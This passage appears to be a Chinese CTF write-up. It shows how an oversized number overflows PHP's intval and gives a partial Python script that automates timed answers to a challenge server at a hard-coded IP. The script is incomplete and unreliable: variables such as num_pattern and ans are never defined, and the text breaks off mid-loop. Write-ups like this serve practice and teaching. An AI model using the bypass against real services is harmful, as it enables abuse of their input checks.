这里使用了 intval 函数，这个函数会获取变量的整数值，根据描述，64 位系统上，最大带符号的 integer 值是 9223372036854775807

<?php echo intval('420000000000000000000');

且上面的数刚好满足 21 位
php 源码在 if 函数中要求回答时间在 1~2s 之间，这显然不是人力所能达到的，所以我们需要利用到 python 来编写脚本回答问题
python 脚本

import requests
import re
import time
s = requests.Session()  # 因为要连续计算，用来保存当前会话的持续有效性
url = "http://1.14.71.254:28978/" #这里修改为你的题目网址
number ="4200000000000000000000"  #输入的数字
proxies = { "http": None, "https": None}
r = s.get(url,proxies=proxies)
math = ''
headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:61.0) Gecko/20100101 Firefox/61.0',
}
# response = requests.get(url, headers=headers,proxies=proxies)

while(1):

    num = num_pattern.findall(r.text)   #正则提取公式
    gg = "9223372036854775807"+'+'+math.join(num)[0:-1]  #拼接真实的公式

    data = "input={number}&ans={ans}%".format(number=number,ans=ans)
